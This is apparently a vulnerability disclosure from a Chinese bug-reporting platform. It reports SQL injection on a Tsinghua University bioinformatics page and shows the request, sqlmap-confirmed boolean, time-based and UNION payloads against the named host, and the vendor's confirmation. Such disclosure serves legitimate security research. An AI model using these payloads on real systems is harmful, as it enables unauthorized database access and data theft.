wybug_title: 清华大学某站存在SQL注入漏洞可UNION
wybug_detail:
漏洞详情 披露状态：   									2015-11-27：	细节已通知厂商并且等待厂商处理中									2015-11-27：	厂商已经确认，细节仅向厂商公开									2015-12-07：	细节向核心白帽子及相关领域专家公开									2015-12-17：	细节向普通白帽子公开									2015-12-27：	细节向实习白帽子公开									2016-01-11：	细节向公众公开  简要描述：  详细说明：  
GET /dbsuper/details.php?cell=C_001&g=hg19&pm=24119843&se_id=SE_00217 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://bioinfo.au.tsinghua.edu.cnCookie: qtrans_cookie_test=qTranslate+Cookie+Test; wordpress_test_cookie=WP+Cookie+check; PHPSESSID=skiari7tbcjt8mj1pogs2uv5d3Host: bioinfo.au.tsinghua.edu.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*





sqlmap resumed the following injection point(s) from stored session:---Parameter: cell (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cell=C_001' AND 5773=5773 AND 'MbIB'='MbIB&g=hg19&pm=24119843&se_id=SE_00217    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: cell=C_001' AND (SELECT * FROM (SELECT(SLEEP(5)))DuBn) AND 'uGsu'='uGsu&g=hg19&pm=24119843&se_id=SE_00217    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: cell=-9342' UNION ALL SELECT CONCAT(0x7176717871,0x54517462494641455a58,0x716b6b7a71),NULL,NULL-- &g=hg19&pm=24119843&se_id=SE_00217---web application technology: PHP 5.3.28, Apache 2.2.16back-end DBMS: MySQL 5.0.12Database: wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-11-27 15:05 厂商回复： 谢谢提醒，我们会尽快修改的。 最新状态： 暂无
